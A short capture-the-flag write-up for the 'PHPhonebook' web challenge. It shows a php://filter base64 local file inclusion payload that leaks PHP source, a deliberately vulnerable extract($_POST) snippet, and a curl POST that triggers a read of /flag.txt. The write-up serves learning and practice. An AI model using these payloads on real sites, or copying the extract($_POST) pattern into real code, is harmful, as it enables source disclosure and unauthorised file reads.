### PHPhonebook

Visiting the site, you can see that the location "phphonebook.php" is referenced, however visiting the url as suggested (`/index.php/?file=phphonebook.php
`) it returns a blank page.
However, there is a trick to get around this - if you add a php filter on it so it encodes the content to base64 as demonstrated below:
`/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook.php`

This returns the source code which contains a very interesting piece of php.
```<?php
    extract($_POST);

    if (isset($emergency)){
        echo(file_get_contents("/flag.txt"));
    }
```
This essentially means, if there is a variable in the POST request named `emergency`, it will retrieve the contents of /flag.txt.
We did this in two ways, with burpsuite and with curl, but the curl request was much more simple, all was needed was:
`curl -X POST 'http://jh2i.com:50002/index.php/?file=phphonebook.php' -d 'emergency=999' | grep flag
`

Voila, the flag is returned.
A relatively simple challenge, but it was definitely interesting to learn about the base64 filter.
